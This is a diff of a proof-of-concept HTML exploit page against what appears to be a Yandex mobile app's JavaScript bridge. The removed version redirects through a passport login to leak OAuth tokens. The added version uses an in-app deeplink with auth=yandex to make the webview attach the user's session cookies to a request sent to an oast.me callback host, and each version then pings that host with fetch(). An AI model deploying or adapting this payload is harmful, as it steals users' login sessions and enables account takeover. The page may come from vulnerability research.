@@ -1,25 +1,22 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CRITICAL ATTACK: Use OPEN_LINK to open Yandex OAuth auth endpoint
-// with retpath pointing to our server. If user is already logged in,
-// Yandex will redirect back to our server WITH the session/token.
-//
-// passport.yandex.ru/auth?retpath=URL redirects to URL after auth
-// If user is already authenticated, it redirects immediately with cookies
+// CRITICAL: Open attacker URL via /open_web deeplink with auth=yandex
+// This should INJECT Yandex passport cookies into the webview before loading our URL
+// Our server will receive the request WITH the user's session cookies
 
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
   type: "OPEN_LINK",
-  trackId: "oauth-steal",
+  trackId: "cookie-steal",
   payload: {
-    url: "https://passport.yandex.ru/auth?retpath=https%3A%2F%2Fda7db8p9tmut9738sbb0r4setdbsf769t.oast.me%2Foauth-redirect",
-    urlType: "WEBLINK",
-    openType: "OUT",
+    url: "ybapp://screen.open/open_web?url=https%3A%2F%2Fda7db8p9tmut9738sbb0r4setdbsf769t.oast.me%2Fcookie-steal&auth=yandex&control=none",
+    urlType: "DEEPLINK",
+    openType: "IN",
     needAuth: false
   }
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/oauth-attack-sent");
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/cookie-steal-sent");
 </script>
 </body>
 </html>
